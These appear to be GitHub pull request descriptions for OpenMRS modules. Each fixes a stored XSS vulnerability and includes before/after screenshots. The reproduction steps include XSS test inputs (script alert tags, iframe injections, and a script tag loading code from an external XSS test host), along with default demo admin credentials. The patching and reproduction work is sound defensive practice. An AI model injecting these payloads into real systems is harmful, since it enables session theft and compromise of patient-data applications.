pr_body:
Hi Team,

This fixes EMPT51. There was an milder version of the fix earlier which wasn't able to fix iframes and possiby complex xss injections.  Steps to reproduce .
i) Loop into the manage forms of the Administration page
ii) Select Admission(simple) and Enter the values in the Find field search box at the bottom right corner from the image.


@isears 

Link to Ticket

https://issues.openmrs.org/browse/RA-1865

Before Fix
![EMPT51_Before_Fix](https://user-images.githubusercontent.com/22288099/119249747-ebee3700-bb4f-11eb-81bb-3c9e15621ca8.png)


After Fix :
![EMPT51](https://user-images.githubusercontent.com/22288099/119249667-45a23180-bb4f-11eb-8cb2-2c81b42de441.png)

pr_title: Made changes to Fix EMPT 61 and EMPT171 :- Try 2
pr_body:
Hi Team,
@ibacher 

Made changes to Fix EMPT 61 and EMPT171 and handle Relatives block explicitly. 
This is my second try to fix EMPT171. Handled the edge case explicitly. The first PR for the same issue was https://github.com/openmrs/openmrs-module-uicommons/pull/89

For EMPT171 :-
Go to Register a Patient

Enter <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT> in all the input fields in the form if client side validator allows it
Press Confirm from the left menu.

Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)

@isears

Added required error message for EMPT70.
Kindly refer to the following PR for all relevant details :- https://github.com/openmrs/openmrs-module-legacyui/pull/164

pr_title: Made changes to remove XSS in displayValue param
pr_body:
Hi Team,
![Issue_EMPT](https://user-images.githubusercontent.com/22288099/121819735-90d9cc80-cc43-11eb-9ff8-e83c16b56107.png)

@isears @ibacher 

Made changes to Fix EMPT 61 and EMPT171 and handle Relatives block explicitly.
This is my third try to fix EMPT171 which Handled the edge case explicitly and properly. The first PR for the same issue was https://github.com/openmrs/openmrs-module-uicommons/pull/89 and the second Pr was https://github.com/openmrs/openmrs-module-uicommons/pull/91.

For EMPT171 :-
i) Go to Register a Patient

ii) Enter <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT> in all the input fields in the form if client side validator allows it
Press Confirm from the left menu.

Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)

@isears

Hi Team,

This change is for fixing EMPT155 . I have performed minor test runs to the best of my abilities. 

Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)

Steps to reproduce :
i) Go to System administration and then to Advance Administration
ii) Upload a invalid file format like .log file etc by clicking browse 
iii) Click Next

Before fix:
![EMPT155_before](https://user-images.githubusercontent.com/22288099/121822389-c4bcee00-cc53-11eb-9d41-c13330156f67.png)


After fix :-

![EMPT155](https://user-images.githubusercontent.com/22288099/121822347-8aebe780-cc53-11eb-98eb-1eccfad9e624.png)

pr_title: C:out changes to manageReportDesigns.jsp for xss
pr_body:
Hi Team,


Update:- This PR now contains solution to the following two fixes EMPT 105 and EMPT 174 (Newly created)

i) Fix 1 resolved EMPT105 incorporating the Review suggestions.
@isears 

ii) Fix 2 Resolved the UI error which props up when one submits empty value from dropdown. (Image below) 

Thanks and Regards,
Parth Kanakiya


Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)
Steps to reproduce EMPT 105:- 

Launch OpenMRS application using the URL: http://localhost:8800/openmrs

1)Provide following info and click login​Username​ as ​admin​ Password​ ​ as ​admin123 Location as ​Inpatient
2)Click on “System administration”
3)Then, click on “Advanced administration”
4)Click on “Report Designs”
5)Select “EXCEL (Default)” and click on “Add another”
6)Enter the following details: Name: <script>alert(2);</script> Description: <script>alert(2);</script> , Report Definition: “List of diagnosis”
Click “Submit”

Before fix

![EMPT105_before](https://user-images.githubusercontent.com/22288099/121990533-c6211000-cd52-11eb-84ff-fcc15c9313e4.png)


After fix

![EMPT105_after](https://user-images.githubusercontent.com/22288099/121990297-6165b580-cd52-11eb-84ef-7de194f8bd47.png)

Steps to reproduce EMPT174

1)Provide the following info and click login​Username​ as ​admin​ Password​ ​ as ​admin123 Location as ​Inpatient
2)Click on “System administration”
3)Then, click on “Advanced administration”
4)Click on “Report Designs”
5) Keep the dropdown empty and then and click on “Add another”


Before fix 
![EMPT174_before](https://user-images.githubusercontent.com/22288099/121990212-4004c980-cd52-11eb-9e9a-4e11eeb306b5.png)

After fix 
![EMPTY_Afterfix](https://user-images.githubusercontent.com/22288099/121990282-5874e400-cd52-11eb-8fea-43b048448bc1.png)

pr_body:
Hi Team,

This change is for fixing EMPT107. I have performed minor test runs to the best of my abilities.

Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)
@isears 

Steps to reproduce :

i) Login in as admin inpatient.
ii) Click on the “Configure Metadata” option.
iii) Click on “Manage Concept Dictionary”.
iv) Click on “Manage Concepts”.
v) Click on “Add New Concept”.
vi) Type in  <iframe src="https://www.csc.ncsu.edu" /> for “Fully Specified Name”, <script>alert(1);</script> for “Short Name”, and <script>alert(3);</script> for “Description”.
vii) Click on “Save Concept”.

viii) Now go to home and then "System administration" -> "Advanced administration"
ix) Click on view concepts dictionary
x) search for <script>

Before fix
![ISSUE_107](https://user-images.githubusercontent.com/22288099/121961298-1fba1800-cd1c-11eb-8bcc-2069fbab66eb.png)

After fix 
![EMPT107_After](https://user-images.githubusercontent.com/22288099/121961536-66a80d80-cd1c-11eb-8d25-81f1ecac8d00.png)

Hi Team,
This change is for fixing EMPT80. I have performed minor test runs to the best of my abilities.
 @isears @sherrif10 

Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)

Steps to reproduce :

1)Launch OpenMRS application using the URL: http://localhost:8080/openmrs

2) Provide following info and click login​Username​ as ​admin​ Password​ ​ as ​admin123 Location as ​Inpatient
3) Click on the “System Administration” module.
4) Click on “Manage Accounts”.
5) Click on the “Add New Account” button.
6) Enter <iframe src=’http://ncsu.edu’> as First Name and Last Name and select Male as Gender.
7) Click on the “Add User Account?” checkbox.
8) Enter “testtest” as Username and select Full as Privilege Level.
9) Enter Admin123 as Password and Confirm Password.
10) Hit Save.
11) Click on the Home icon on the top left corner.
12) Click on “System Administration” module.
13) Click on “Advance Administration module.
14) Click on “Manage Alerts” and then “Add Alert”.
15) Click on the “Add” button next to “Recipients” panel.

Before fix :
![Before](https://user-images.githubusercontent.com/22288099/123551448-b0362680-d726-11eb-93fa-d25c6f1a01db.png)


After fix:
![After_EMPT80](https://user-images.githubusercontent.com/22288099/123551514-0014ed80-d727-11eb-8397-435d1a86f4a0.png)

Hi Team,
This change is for fixing EMPT82. I have performed minor test runs to the best of my abilities.
@isears @sherrif10

Link to ticket
RA-1875 (https://issues.openmrs.org/browse/RA-1875)

Steps to reproduce :

1)Launch OpenMRS application using the URL: http://localhost:8080/openmrs

2)Provide following info and click login​Username​ as ​admin​ Password​ ​ as ​admin123 Location as ​Inpatient
3. Click System Administration.
4. Click Manage Accounts.
5. Select Add New Account.
6. Enter </script> <script>alert(`hello`)</script> as the family name, </script> <script>alert(`hello`)</script> as the given name, and select the gender as male.
7. Check Add Provider Account
8. Enter the Identifier as jdoe5 and select Clerk as the Provider Role.
9. Navigate back to the home page by selecting OpenMRS in the top left corner.
10. Select Find Patient Record and select John D Patient.
11. Select Request Appointment. Type in script and select the provider we just created, and enter Surgery as the service type. 

Before fix 
![Beofre](https://user-images.githubusercontent.com/22288099/123563084-7c2f2580-d767-11eb-9b6d-c6abaf9383d0.png)




After fix 

![After_EMPT80](https://user-images.githubusercontent.com/22288099/123563029-1e9ad900-d767-11eb-9da1-eb54db7a725c.png)
![After_EMPT80_Part2](https://user-images.githubusercontent.com/22288099/123563030-1fcc0600-d767-11eb-8ef3-bfd5a8eeb0a7.png)

pr_title: Added angular sanitize library from uicommons for EMPT84
pr_body:
Hi Team,
@isears
Added angular sanitize from uicommons module to prevent XSS in 'directives/coded-or-free-text-answer.js'


Kindly refer to the following issue for more details :-
https://github.com/openmrs/openmrs-module-uicommons/pull/88

pr_title: Added angular sanitize  from uicommons for EMPT84
pr_body:
Hi Team,

@isears
Added angular sanitize from uicommons module to prevent XSS in 'directives/coded-or-free-text-answer.js'

Kindly refer to the following issue for more details:-
openmrs/openmrs-module-uicommons#88

Hi Team,

Here's the link to the ticket. 
Link to ticket
https://issues.openmrs.org/browse/RA-1865

Issue I worked on

Steps to reproduce 
i) Go to "Manage Privileges" and add a new privileged named <script>alert(1);</script> (this is harmless by itself)
ii) Go to "Manage Roles" and assign that privilege to a role (or create a new role).
iii) See the 1 in the alert box

Before Fix 
![image](https://user-images.githubusercontent.com/22288099/126845223-5ea35f68-c707-4c7f-b341-2f6441a0c04f.png)

After fix
![Latest_Issue](https://user-images.githubusercontent.com/22288099/126845360-961ad182-1756-43d2-b0d2-bdf51d677e54.png)

@isears @sherrif10 

Thanks

Hi Team,

Steps to reproduce. Worked together with @kfb19 to achieve this fix.

1) Go to "Manage Privileges" and add a new privileged named <script>alert(1);</script> (this is harmless by itself)
2) Delete that privilege.
3)Get the alert box.

1) Similarly Create a role named <script>alert(1);</script>.
2) Delete that role.
3) Get the alert box.

Will be adding the before and after fix soon.


Here's the link to the ticket.
Link to ticket
https://issues.openmrs.org/browse/RA-1865

@isears @sherrif10 

Thanks,
Parth
